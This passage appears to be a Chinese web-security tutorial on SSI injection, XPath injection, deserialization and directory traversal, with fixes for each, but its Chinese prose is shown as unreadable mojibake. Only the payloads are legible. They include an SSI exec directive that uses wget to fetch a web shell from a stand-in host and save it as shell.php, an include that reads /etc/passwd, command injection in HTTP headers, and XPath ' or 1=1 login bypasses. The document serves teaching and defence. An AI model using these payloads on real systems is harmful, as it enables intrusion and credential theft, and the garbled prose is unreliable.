ä½¿ç”¨wfuzzå·¥å…·ï¼šhttps://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt ä¿®å¤å»ºè®® é˜²æ­¢XXEçš„æœ€å®‰å…¨æ–¹æ³•å§‹ç»ˆæ˜¯å®Œå…¨ç¦ç”¨DTDï¼ˆå¤–éƒ¨å®žä½“ï¼‰ã€‚ ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®žä½“çš„æ–¹æ³•ï¼š 12345678910PHPlibxml_disable_entity_loader(true);JAVADocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Pythonfrom lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®ï¼š&lt;!DOCTYPEå’Œ&lt;!ENTITYï¼Œæˆ–è€…ï¼ŒSYSTEMå’ŒPUBLICã€‚ SSIæ³¨å…¥æ¼æ´žæè¿° SSIæ˜¯Webåº”ç”¨ç¨‹åºä¸Šå­˜åœ¨çš„æŒ‡ä»¤ï¼Œç”¨äºŽå‘HTMLé¡µé¢æä¾›åŠ¨æ€å†…å®¹ã€‚å®ƒä»¬ä¸ŽCGIç›¸ä¼¼ï¼Œé™¤äº†SSIç”¨äºŽåœ¨åŠ è½½å½“å‰é¡µé¢ä¹‹å‰æˆ–åœ¨å¯è§†åŒ–é¡µé¢æ—¶æ‰§è¡ŒæŸäº›æ“ä½œã€‚ä¸ºæ­¤ï¼ŒWebæœåŠ¡å™¨åœ¨å°†é¡µé¢æä¾›ç»™ç”¨æˆ·ä¹‹å‰å…ˆåˆ†æžSSIã€‚ æœåŠ¡å™¨ç«¯åŒ…å«æ”»å‡»å…è®¸é€šè¿‡åœ¨HTMLé¡µé¢ä¸­æ³¨å…¥è„šæœ¬æˆ–è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç æ¥åˆ©ç”¨Webåº”ç”¨ç¨‹åºã€‚å¯ä»¥é€šè¿‡æ“çºµåº”ç”¨ç¨‹åºä¸­ä½¿ç”¨çš„SSIæ¥åˆ©ç”¨å®ƒï¼Œä¹Ÿå¯ä»¥é€šè¿‡ç”¨æˆ·è¾“å…¥å­—æ®µæ¥å¼ºåˆ¶ä½¿ç”¨å®ƒã€‚ æ¼æ´žå±å®³ æ”»å‡»è€…å¯ä»¥è®¿é—®æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚å¯†ç æ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œæœªç»æŽˆæƒçš„ä»£ç æˆ–å‘½ä»¤ã€‚SSIä¼ªæŒ‡ä»¤æ³¨å…¥åˆ°è¾“å…¥å­—æ®µä¸­ï¼Œå¹¶å°†å®ƒä»¬å‘é€åˆ°WebæœåŠ¡å™¨ã€‚WebæœåŠ¡å™¨åœ¨æä¾›é¡µé¢ä¹‹å‰ä¼šè§£æžå¹¶æ‰§è¡ŒæŒ‡ä»¤ã€‚ç„¶åŽï¼Œä¸‹æ¬¡ä¸ºç”¨æˆ·çš„æµè§ˆå™¨åŠ è½½é¡µé¢æ—¶ï¼Œæ”»å‡»ç»“æžœå°†å¯è§ã€‚ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1ï¼šæ ¹æ®æ‰€ä½¿ç”¨çš„æœåŠ¡å™¨æ“ä½œç³»ç»Ÿï¼Œç”¨äºŽæ³¨å…¥SSIçš„å‘½ä»¤ä¼šæœ‰æ‰€ä¸åŒã€‚ä»¥ä¸‹å‘½ä»¤ä»£è¡¨åº”ç”¨äºŽæ‰§è¡ŒOSå‘½ä»¤çš„è¯­æ³•ã€‚ â€‹ Linuxï¼š 12345678åˆ—å‡ºç›®å½•æ–‡ä»¶ï¼š&lt;!--#exec cmd="ls" --&gt;è®¿é—®ç›®å½•ï¼š&lt;!--#exec cmd="cd /root/dir/"&gt;è®¿é—®ç›®å½•ï¼š&lt;!--#exec cmd="cd /root/dir/"&gt;æ‰§è¡Œè„šæœ¬ï¼š&lt;!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" --&gt; â€‹ Windowsï¼š 1234åˆ—å‡ºç›®å½•æ–‡ä»¶ï¼š&lt;!--#exec cmd="dir" --&gt;è®¿é—®ç›®å½•ï¼š&lt;!--#exec cmd="cd C:\admin\dir"&gt; åœºæ™¯2ï¼š â€‹ å¯ç”¨äºŽè®¿é—®å’Œè®¾ç½®æœåŠ¡å™¨ä¿¡æ¯çš„å…¶ä»–SSIç¤ºä¾‹ï¼š 12345678910è¦æ›´æ”¹é”™è¯¯æ¶ˆæ¯è¾“å‡ºï¼š&lt;!--#config errmsg="File not found, informs users and password"--&gt;è¦æ˜¾ç¤ºå½“å‰æ–‡æ¡£çš„æ–‡ä»¶åï¼š&lt;!--#echo var="DOCUMENT_NAME" --&gt;è¦æ˜¾ç¤ºè™šæ‹Ÿè·¯å¾„å’Œæ–‡ä»¶åï¼š&lt;!--#echo var="DOCUMENT_URI" --&gt;ä½¿ç”¨â€œ configâ€å‘½ä»¤å’Œâ€œ timefmtâ€å‚æ•°ï¼Œå¯ä»¥æŽ§åˆ¶æ—¥æœŸå’Œæ—¶é—´è¾“å‡ºæ ¼å¼ï¼š&lt;!--#config timefmt="A %B %d %Y %r"--&gt;ä½¿ç”¨â€œ fsizeâ€å‘½ä»¤ï¼Œå¯ä»¥æ‰“å°æ‰€é€‰æ–‡ä»¶çš„å¤§å°ï¼š&lt;!--#fsize file="ssi.shtml" --&gt; æ£€æµ‹æ–¹æ³• å‰ææ¡ä»¶ï¼š æ”¯æŒæœåŠ¡å™¨ç«¯çš„WebæœåŠ¡å™¨åŒ…æ‹¬å¹¶å¯ç”¨äº†å®ƒä»¬ï¼Œç”¨æˆ·å¯æŽ§åˆ¶çš„è¾“å…¥ï¼Œå¯ä»¥åŒ…å«WebæœåŠ¡å™¨çš„åŒ…å«æŒ‡ä»¤ã€‚ æŸ¥æ‰¾æµè¡Œçš„é¡µé¢æ–‡ä»¶åã€‚æ”»å‡»è€…å°†åœ¨URLä¸­å¯»æ‰¾.shtmlï¼Œ.shtmï¼Œ.aspï¼Œ.aspxå’Œå…¶ä»–çŸ¥åå­—ç¬¦ä¸²ï¼Œä»¥å¸®åŠ©ç¡®å®šæ˜¯å¦å¯ç”¨äº†SSIåŠŸèƒ½ã€‚ æå–.htaccessæ–‡ä»¶ã€‚åœ¨Apache WebæœåŠ¡å™¨å®‰è£…ä¸­ï¼Œ.htaccessæ–‡ä»¶å¯ä»¥åœ¨ç‰¹å®šä½ç½®å¯ç”¨æœåŠ¡å™¨ç«¯åŒ…å«ã€‚åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œ.htaccessæ–‡ä»¶ä½äºŽå¯ç”¨SSIçš„ç›®å½•ä¸­ï¼Œå¹¶ä¸”ä»Žç†è®ºä¸Šè®²å¯ä»¥ä»ŽWebæœåŠ¡å™¨èŽ·å–ã€‚å°½ç®¡å¤§å¤šæ•°WebæœåŠ¡å™¨éƒ½æ‹’ç»èŽ·å–.htaccessæ–‡ä»¶ï¼Œä½†é…ç½®é”™è¯¯çš„æœåŠ¡å™¨å°†å…è®¸å®ƒã€‚ ä½¿ç”¨ä»£ç†å·¥å…·æ¥è·Ÿè¸ªå’Œè®°å½•æ‰€æœ‰é“¾æŽ¥ã€‚ç‰¹åˆ«æ³¨æ„URLä¸­åŒ…å«å‚æ•°çš„ä»»ä½•é“¾æŽ¥ã€‚ ä½¿ç”¨ä»£ç†å·¥å…·è®°å½•åœ¨æ‰‹åŠ¨éåŽ†Webåº”ç”¨ç¨‹åºæœŸé—´è®¿é—®çš„æ‰€æœ‰é“¾æŽ¥ã€‚ç‰¹åˆ«æ³¨æ„URLä¸­åŒ…å«å‚æ•°çš„ä»»ä½•é“¾æŽ¥ã€‚ç»å¸¸éœ€è¦ä½¿ç”¨è¿™ç§ç±»åž‹çš„æ‰‹åŠ¨éåŽ†æ¥è¯†åˆ«å±žäºŽGETæ–¹æ³•å½¢å¼è€Œä¸æ˜¯POSTå½¢å¼çš„å½¢å¼ã€‚ å¸¸è§æµ‹è¯•ä»£ç ï¼š 12345678&lt;!--#echo var="DATE_LOCAL" --&gt;æ‰“å°å½“å‰æ—¶é—´ã€‚&lt;!--#include virtual="/cgi-bin/counter.pl" --&gt;åŒ…æ‹¬CGIè„šæœ¬çš„è¾“å‡ºã€‚&lt;!--#include virtual="/footer.html" --&gt;åœ¨ç›®å½•ä¸­åŒ…å«æ–‡ä»¶æˆ–åˆ—è¡¨æ–‡ä»¶çš„å†…å®¹ã€‚&lt;!--#exec cmd="ls" --&gt;åŒ…æ‹¬ç³»ç»Ÿå‘½ä»¤çš„è¾“å‡ºã€‚ æ‰¾åˆ°æ½œåœ¨çš„æ³¨å…¥ç‚¹åˆ—è¡¨åŽï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥è¾“å…¥æ˜¯å¦æ­£ç¡®éªŒè¯ï¼Œç„¶åŽæ‰¾å‡ºæ‰€æä¾›è¾“å…¥çš„å­˜å‚¨ä½ç½®ã€‚æˆ‘ä»¬éœ€è¦ç¡®ä¿å¯ä»¥æ³¨å…¥SSIæŒ‡ä»¤ä¸­ä½¿ç”¨çš„å­—ç¬¦ï¼š 1&lt; ! # = / . " - &gt; and [a-zA-Z0-9] ä¸ºäº†æµ‹è¯•éªŒè¯æ˜¯å¦è¶³å¤Ÿï¼Œæˆ‘ä»¬å¯ä»¥ä»¥è¾“å…¥å½¢å¼è¾“å…¥ä¾‹å¦‚ä»¥ä¸‹å­—ç¬¦ä¸²ï¼š 1&lt;!--#include virtual="/etc/passwd" --&gt; å¦‚æžœWebåº”ç”¨ç¨‹åºå°†ä½¿ç”¨è¯¥æ•°æ®æ¥æž„å»ºåŠ¨æ€ç”Ÿæˆçš„é¡µé¢ï¼Œåˆ™ä¹Ÿå¯ä»¥åœ¨HTTPæ ‡å¤´ä¸­æ‰§è¡Œæ³¨å…¥ï¼š 123GET / HTTP/1.0Referer: &lt;!--#exec cmd="/bin/ps ax"--&gt;User-Agent: &lt;!--#include virtual="/proc/version"--&gt; ä¿®å¤å»ºè®® åœ¨å…¨å±€access.confæ–‡ä»¶æˆ–æœ¬åœ°.htaccessï¼ˆApacheï¼‰æ–‡ä»¶ä¸­è®¾ç½®OPTIONS IncludesNOEXECï¼Œä»¥æ‹’ç»ä¸éœ€è¦å®ƒä»¬çš„ç›®å½•ä¸­çš„SSIæ‰§è¡Œã€‚ å¿…é¡»å¯¹æ‰€æœ‰ç”¨æˆ·å¯æŽ§åˆ¶çš„è¾“å…¥è¿›è¡Œé€‚å½“çš„è¿‡æ»¤ã€‚è¿™åŒ…æ‹¬çœç•¥æˆ–ç¼–ç æŸäº›å¯èƒ½è¢«è§£é‡Šä¸ºSSIæŒ‡ä»¤ä¸€éƒ¨åˆ†çš„å­—ç¬¦æˆ–å­—ç¬¦ä¸²ã€‚ éžå¿…è¦æƒ…å†µä¸‹å…³é—­â€œæœåŠ¡ç«¯åŒ…å«â€ã€‚ XPATHæ³¨å…¥æ¼æ´žæè¿° XPathæ˜¯ä¸€ç§ä¸»è¦ä¸ºè§£å†³XMLæ–‡æ¡£çš„æŸäº›éƒ¨åˆ†è€Œè®¾è®¡å’Œå¼€å‘çš„è¯­è¨€ã€‚XPathæ³¨å…¥ä¸ŽSQLæ³¨å…¥ç±»ä¼¼ï¼Œå½“ç½‘ç«™ä½¿ç”¨ç”¨æˆ·æä¾›çš„ä¿¡æ¯ä¸ºXMLæ•°æ®æž„é€ XPathæŸ¥è¯¢æ—¶ï¼Œå°±ä¼šå‘ç”ŸXPathæ³¨å…¥æ”»å‡»ã€‚é€šè¿‡å°†æ•…æ„æ ¼å¼é”™è¯¯çš„ä¿¡æ¯å‘é€åˆ°ç½‘ç«™ï¼Œæ”»å‡»è€…å¯ä»¥äº†è§£XMLæ•°æ®çš„ç»“æž„ï¼Œæˆ–è®¿é—®ä»–ä»¬é€šå¸¸æ— æ³•è®¿é—®çš„æ•°æ®ã€‚ XMLçš„æŸ¥è¯¢æ˜¯é€šè¿‡XPathå®Œæˆçš„ï¼ŒXPathæ˜¯ä¸€ç§ç®€å•çš„æè¿°æ€§è¯­å¥ï¼Œå®ƒå…è®¸XMLæŸ¥è¯¢æ‰¾åˆ°ä¸€æ¡ä¿¡æ¯ã€‚ä¸ŽSQLä¸€æ ·ï¼Œæ‚¨å¯ä»¥æŒ‡å®šè¦æŸ¥æ‰¾çš„æŸäº›å±žæ€§ä»¥åŠè¦åŒ¹é…çš„æ¨¡å¼ã€‚åœ¨ç½‘ç«™ä¸Šä½¿ç”¨XMLæ—¶ï¼Œé€šå¸¸ä¼šæŽ¥å—æŸ¥è¯¢å­—ç¬¦ä¸²çš„æŸç§å½¢å¼çš„è¾“å…¥ï¼Œä»¥æ ‡è¯†è¦å®šä½å¹¶æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šçš„å†…å®¹ã€‚ æ¼æ´žå±å®³ å¦‚æžœå°†XMLæ•°æ®ç”¨äºŽèº«ä»½éªŒè¯ï¼ˆä¾‹å¦‚ï¼ŒåŸºäºŽXMLçš„ç”¨æˆ·æ–‡ä»¶ï¼‰ï¼Œä»–ä»¬ç”šè‡³å¯ä»¥åœ¨ç½‘ç«™ä¸Šæå‡ç‰¹æƒã€‚ æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´žåŽï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæœªç»é€‚å½“çš„æŽˆæƒå°±ç»•è¿‡èº«ä»½éªŒè¯æœºåˆ¶æˆ–è®¿é—®ä¿¡æ¯ã€‚ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1ï¼šæˆ‘ä»¬å°†ä½¿ç”¨æ­¤XMLä»£ç æ®µä½œä¸ºç¤ºä¾‹ 1234567891011121314151617&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;Employees&gt; &lt;Employee ID="1"&gt; &lt;FirstName&gt;Arnold&lt;/FirstName&gt; &lt;LastName&gt;Baker&lt;/LastName&gt; &lt;UserName&gt;ABaker&lt;/UserName&gt; &lt;Password&gt;SoSecret&lt;/Password&gt; &lt;Type&gt;Admin&lt;/Type&gt; &lt;/Employee&gt; &lt;Employee ID="2"&gt; &lt;FirstName&gt;Peter&lt;/FirstName&gt; &lt;LastName&gt;Pan&lt;/LastName&gt; &lt;UserName&gt;PPan&lt;/UserName&gt; &lt;Password&gt;NotTelling&lt;/Password&gt; &lt;Type&gt;User&lt;/Type&gt; &lt;/Employee&gt;&lt;/Employees&gt; â€‹ å‡è®¾æˆ‘ä»¬åœ¨ç½‘é¡µä¸Šæœ‰ä¸€ä¸ªç”¨æˆ·èº«ä»½éªŒè¯ç³»ç»Ÿï¼Œè¯¥ç³»ç»Ÿä½¿ç”¨è¿™ç§æ•°æ®æ–‡ä»¶æ¥ç™»å½•ç”¨æˆ·ã€‚æä¾›ç”¨æˆ·åå’Œå¯†ç åŽï¼Œè¯¥è½¯ä»¶å¯èƒ½ä¼šä½¿ç”¨XPathæŸ¥æ‰¾ç”¨æˆ·ï¼š 123456789VB:Dim FindUserXPath as StringFindUserXPath = "//Employee[UserName/text()='" &amp; Request("Username") &amp; "' And Password/text()='" &amp; Request("Password") &amp; "']"C#:String FindUserXPath;FindUserXPath = "//Employee[UserName/text()='" + Request("Username") + "' And Password/text()='" + Request("Password") + "']"; â€‹ ä½¿ç”¨æ™®é€šçš„ç”¨æˆ·åå’Œå¯†ç ï¼Œæ­¤XPathå¯ä»¥å·¥ä½œï¼Œä½†æ˜¯æ”»å‡»è€…å¯èƒ½å‘é€é”™è¯¯çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶åœ¨ä¸çŸ¥é“ç”¨æˆ·åæˆ–å¯†ç çš„æƒ…å†µä¸‹é€‰æ‹©äº†XMLèŠ‚ç‚¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1234567Username: blah' or 1=1 or 'a'='aPassword: blahFindUserXPath becomes //Employee[UserName/text()='blah' or 1=1 or 'a'='a' And Password/text()='blah']Logically this is equivalent to: //Employee[(UserName/text()='blah' or 1=1) or ('a'='a' And Password/text()='blah')] â€‹ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä»…XPathçš„ç¬¬ä¸€éƒ¨åˆ†éœ€è¦ä¸ºçœŸã€‚å¯†ç éƒ¨åˆ†å˜å¾—æ— å…³ç´§è¦ï¼Œå¹¶ä¸”ç”±äºŽâ€œ 1 = 1â€éƒ¨åˆ†ï¼Œç”¨æˆ·åéƒ¨åˆ†å°†ä¸Žæ‰€æœ‰å‘˜å·¥åŒ¹é…ã€‚ æ£€æµ‹æ–¹æ³• åœ¨XPathæ³¨å…¥æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬æµ‹è¯•æ˜¯å¦å¯ä»¥å°†XPathè¯­æ³•æ³¨å…¥åˆ°åº”ç”¨ç¨‹åºè§£é‡Šçš„è¯·æ±‚ä¸­ï¼Œä»Žè€Œå…è®¸æ”»å‡»è€…æ‰§è¡Œç”¨æˆ·æŽ§åˆ¶çš„XPathæŸ¥è¯¢ã€‚ å‡è®¾æˆ‘ä»¬çš„æ•°æ®åº“ç”±ä»¥ä¸‹XMLæ–‡ä»¶è¡¨ç¤ºï¼š 123456789101112131415161718&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;users&gt; &lt;user&gt; &lt;username&gt;gandalf&lt;/username&gt; &lt;password&gt;!c3&lt;/password&gt; &lt;account&gt;admin&lt;/account&gt; &lt;/user&gt; &lt;user&gt; &lt;username&gt;Stefan0&lt;/username&gt; &lt;password&gt;w1s3c&lt;/password&gt; &lt;account&gt;guest&lt;/account&gt; &lt;/user&gt; &lt;user&gt; &lt;username&gt;tony&lt;/username&gt; &lt;password&gt;Un6R34kb!e&lt;/password&gt; &lt;account&gt;guest&lt;/account&gt; &lt;/user&gt;&lt;/users&gt; ä¸€ä¸ªè¿”å›žç”¨æˆ·ågandalfå’Œå¯†ç ä¸ºçš„å¸æˆ·çš„XPathæŸ¥è¯¢!c3å¦‚ä¸‹ï¼š 1string(//user[username/text()='gandalf' and password/text()='!c3']/account/text()) å¦‚æžœåº”ç”¨ç¨‹åºæœªæ­£ç¡®è¿‡æ»¤ç”¨æˆ·è¾“å…¥ï¼Œåˆ™æµ‹è¯•äººå‘˜å°†èƒ½å¤Ÿæ³¨å…¥XPathä»£ç å¹¶å¹²æ‰°æŸ¥è¯¢ç»“æžœã€‚ä¾‹å¦‚ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥è¾“å…¥ä»¥ä¸‹å€¼ï¼š 1Username: ' or '1' = '1 Password: ' or '1' = '1 ä½¿ç”¨è¿™äº›å‚æ•°ï¼ŒæŸ¥è¯¢å°†å˜ä¸ºï¼š 1string(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']/account/text()) ä¸Žå¸¸è§çš„SQLæ³¨å…¥æ”»å‡»ä¸€æ ·ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªå§‹ç»ˆä¸ºtrueçš„æŸ¥è¯¢ï¼Œè¿™æ„å‘³ç€å³ä½¿æœªæä¾›ç”¨æˆ·åæˆ–å¯†ç ï¼Œåº”ç”¨ç¨‹åºä¹Ÿå°†å¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€‚ä¸Žä½¿ç”¨XPathæ³¨å…¥çš„å¸¸è§SQLæ³¨å…¥æ”»å‡»ä¸€æ ·ï¼Œç¬¬ä¸€æ­¥æ˜¯åœ¨è¦æµ‹è¯•çš„å­—æ®µä¸­æ’å…¥&#39;(å•å¼•å·)ï¼Œåœ¨æŸ¥è¯¢ä¸­å¼•å…¥è¯­æ³•é”™è¯¯ï¼Œå¹¶æ£€æŸ¥åº”ç”¨ç¨‹åºæ˜¯å¦è¿”å›žé”™è¯¯æ¶ˆæ¯ã€‚ ä¿®å¤å»ºè®® å°±åƒé¿å…SQLæ³¨å…¥çš„æŠ€æœ¯ä¸€æ ·ï¼Œéœ€è¦ä½¿ç”¨å‚æ•°åŒ–çš„XPathæŽ¥å£ï¼Œæˆ–è€…è½¬ä¹‰ç”¨æˆ·è¾“å…¥ä»¥ä½¿å…¶å¯ä»¥å®‰å…¨åœ°åŒ…å«åœ¨åŠ¨æ€æž„é€ çš„æŸ¥è¯¢ä¸­ã€‚å¦‚æžœä½¿ç”¨å¼•å·ç»ˆæ­¢åŠ¨æ€æž„é€ çš„XPathæŸ¥è¯¢ä¸­çš„ä¸å¯ä¿¡è¾“å…¥ï¼Œåˆ™éœ€è¦åœ¨ä¸å¯ä¿¡è¾“å…¥ä¸­è½¬ä¹‰è¯¥å¼•å·ï¼Œä»¥ç¡®ä¿ä¸å¯ä¿¡æ•°æ®ä¸èƒ½å°è¯•è„±ç¦»è¯¥å¼•ç”¨ä¸Šä¸‹æ–‡ã€‚åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œå•å¼•å·ï¼ˆ&#39;ï¼‰ç”¨äºŽç»ˆæ­¢Usernameå’ŒPasswordå‚æ•°ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ç”¨è¯¥å­—ç¬¦çš„XMLç¼–ç ç‰ˆæœ¬ï¼ˆå³â€œ&#39;â€ï¼‰æ›¿æ¢æ­¤è¾“å…¥ä¸­çš„æ‰€æœ‰&#39;å­—ç¬¦ã€‚ ä½¿ç”¨é¢„ç¼–è¯‘çš„XPATHæŸ¥è¯¢ï¼Œé¢„ç¼–è¯‘çš„XPathæŸ¥è¯¢æ˜¯åœ¨ç¨‹åºæ‰§è¡Œå‰å·²ç»é¢„è®¾ã€‚ ååºåˆ—åŒ–æ¼æ´žæè¿° åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ˜¯æŒ‡ä»¥ä¸‹è¿‡ç¨‹ï¼šèŽ·å–ç¨‹åºå†…éƒ¨ä¸Žå¯¹è±¡ç›¸å…³çš„æ•°æ®ï¼Œå°†å…¶æ‰“åŒ…ä»¥å…è®¸å°†æ•°æ®ä»Žå¤–éƒ¨å­˜å‚¨æˆ–ä¼ è¾“ï¼ˆâ€œåºåˆ—åŒ–â€ï¼‰ï¼Œç„¶åŽæå–åºåˆ—åŒ–çš„æ•°æ®ä»¥é‡å»ºåŽŸå§‹å¯¹è±¡ï¼ˆâ€œååºåˆ—åŒ–â€ï¼‰ã€‚ åºåˆ—åŒ–æ˜¯å°†æŸäº›å¯¹è±¡è½¬æ¢ä¸ºå¯ä»¥ç¨åŽæ¢å¤çš„æ•°æ®æ ¼å¼çš„è¿‡ç¨‹ã€‚äººä»¬ç»å¸¸åºåˆ—åŒ–å¯¹è±¡ï¼Œä»¥å°†å…¶ä¿å­˜åˆ°å­˜å‚¨ä¸­æˆ–ä½œä¸ºé€šä¿¡çš„ä¸€éƒ¨åˆ†è¿›è¡Œå‘é€ã€‚ ååºåˆ—åŒ–æ˜¯è¯¥è¿‡ç¨‹çš„é€†è¿‡ç¨‹ï¼Œå®ƒé‡‡ç”¨æŸç§æ ¼å¼æž„é€ æ•°æ®ï¼Œç„¶åŽå°†å…¶é‡å»ºä¸ºå¯¹è±¡ã€‚å¦‚ä»Šï¼Œç”¨äºŽåºåˆ—åŒ–æ•°æ®çš„æœ€æµè¡Œçš„æ•°æ®æ ¼å¼æ˜¯JSONã€‚åœ¨æ­¤ä¹‹å‰ï¼Œå®ƒæ˜¯XMLã€‚ æ¼æ´žå±å®³ ååºåˆ—åŒ–å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»ï¼Œè¿™æ˜¯å¯èƒ½å‘ç”Ÿçš„æœ€ä¸¥é‡çš„æ”»å‡»ä¹‹ä¸€ã€‚ æ”»å‡»æ¡ˆä¾‹ Â·Â·Â·Â·Â·Â· æ£€æµ‹æ–¹æ³• é»‘ç›’æµ‹è¯•ï¼š æœç´¢ä»¥ä¸‹ä»¥ä¸‹åˆ—å¼€å¤´çš„base64ç¼–ç çš„å†…å®¹ï¼š 1AAEAAAD///// æœç´¢å¸¦æœ‰ä»¥ä¸‹æ–‡æœ¬çš„å†…å®¹ï¼š 12TypeObject$type: ç™½ç›’æµ‹è¯•ï¼š åœ¨æºä»£ç ä¸­æœç´¢ä»¥ä¸‹æœ¯è¯­ï¼š 12TypeNameHandlingJavaScriptTypeResolver ä¿®å¤å»ºè®® ä¸å…è®¸æ•°æ®æµå®šä¹‰å°†ååºåˆ—åŒ–åˆ°çš„å¯¹è±¡çš„ç±»åž‹ã€‚å¯ä»¥é€šè¿‡ä½¿ç”¨DataContractSerializeræˆ–XmlSerializerå°½å¯èƒ½é¿å…è¿™ç§æƒ…å†µã€‚ ä½¿ç”¨æ›¿ä»£æ•°æ®æ ¼å¼ï¼šé€šè¿‡é¿å…æœ¬æœºï¼ˆåï¼‰åºåˆ—åŒ–æ ¼å¼ï¼Œå¯ä»¥å¤§å¤§é™ä½Žé£Žé™©ã€‚é€šè¿‡åˆ‡æ¢ä¸ºJSONæˆ–XMLä¹‹ç±»çš„çº¯æ•°æ®æ ¼å¼ï¼Œå¯ä»¥å‡å°‘è‡ªå®šä¹‰ååºåˆ—åŒ–é€»è¾‘é‡æ–°ç”¨äºŽæ¶æ„ç›®çš„çš„æœºä¼šã€‚ ä»…ååºåˆ—åŒ–ç­¾åæ•°æ®ï¼šå¦‚æžœåº”ç”¨ç¨‹åºåœ¨ååºåˆ—åŒ–ä¹‹å‰çŸ¥é“éœ€è¦å¤„ç†å“ªäº›æ¶ˆæ¯ï¼Œåˆ™å¯ä»¥åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯¹å®ƒä»¬è¿›è¡Œç­¾åã€‚ç„¶åŽï¼Œåº”ç”¨ç¨‹åºå¯ä»¥é€‰æ‹©ä¸å¯¹æ²¡æœ‰èº«ä»½éªŒè¯ç­¾åçš„ä»»ä½•æ¶ˆæ¯è¿›è¡Œååºåˆ—åŒ–ã€‚ ç›®å½•éåŽ†æ¼æ´žæè¿° ç”±äºŽWebæœåŠ¡å™¨æˆ–è€…Webåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶åç§°çš„å®‰å…¨æ€§éªŒè¯ä¸è¶³è€Œå¯¼è‡´çš„ä¸€ç§å®‰å…¨æ¼æ´žï¼Œä½¿å¾—æ”»å‡»è€…é€šè¿‡åˆ©ç”¨ä¸€äº›ç‰¹æ®Šå­—ç¬¦å°±å¯ä»¥ç»•è¿‡æœåŠ¡å™¨çš„å®‰å…¨é™åˆ¶ï¼Œè®¿é—®ä»»æ„çš„æ–‡ä»¶ï¼ˆå¯ä»¥ä½¿Webæ ¹ç›®å½•ä»¥å¤–çš„æ–‡ä»¶ï¼‰ï¼Œç”šè‡³æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ ç¨‹åºåœ¨å®žçŽ°ä¸Šæ²¡æœ‰å……åˆ†è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„../ä¹‹ç±»çš„ç›®å½•è·³è½¬ç¬¦ï¼Œå¯¼è‡´æ¶æ„ç”¨æˆ·å¯ä»¥é€šè¿‡æäº¤ç›®å½•è·³è½¬æ¥éåŽ†æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚ æ¼æ´žå±å®³ æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿåˆ›å»ºï¼Œè¦†ç›–ï¼Œåˆ é™¤æˆ–ç ´åï¼Œç”¨äºŽæ‰§è¡Œä»£ç çš„å…³é”®æ–‡ä»¶ï¼Œä¾‹å¦‚ç¨‹åºæˆ–åº“ã€‚ å¦‚æžœç›®æ ‡æ–‡ä»¶ç”¨äºŽå®‰å…¨æœºåˆ¶ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿç»•è¿‡è¯¥æœºåˆ¶ã€‚ä¾‹å¦‚ï¼Œåœ¨å¯†ç æ–‡ä»¶æœ«å°¾é™„åŠ æ–°å¸æˆ·å¯èƒ½ä½¿æ”»å‡»è€…å¯ä»¥ç»•è¿‡èº«ä»½éªŒè¯ã€‚ æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿè¯»å–æ„å¤–æ–‡ä»¶çš„å†…å®¹å¹¶æš´éœ²æ•æ„Ÿæ•°æ®ã€‚å¦‚æžœç›®æ ‡æ–‡ä»¶ç”¨äºŽå®‰å…¨æœºåˆ¶ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿç»•è¿‡è¯¥æœºåˆ¶ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡è¯»å–å¯†ç æ–‡ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥è¿›è¡Œæš´åŠ›ç ´è§£å¯†ç çŒœæµ‹æ”»å‡»ï¼Œä»¥ä¾¿èŽ·å–ç›®æ ‡ç³»ç»Ÿå¸æˆ·æƒé™ã€‚ å¯èƒ½ä¼šå®Œå…¨é˜»æ­¢ç›®æ ‡è¿è¡Œï¼Œå¹¶ä¸”åœ¨ä½¿ç”¨è¯¸å¦‚èº«ä»½éªŒè¯ä¹‹ç±»çš„ä¿æŠ¤æœºåˆ¶çš„æƒ…å†µä¸‹ï¼Œå®ƒå¯èƒ½ä¼šé”å®šç›®æ ‡çš„æ¯ä¸ªç”¨æˆ·ã€‚ 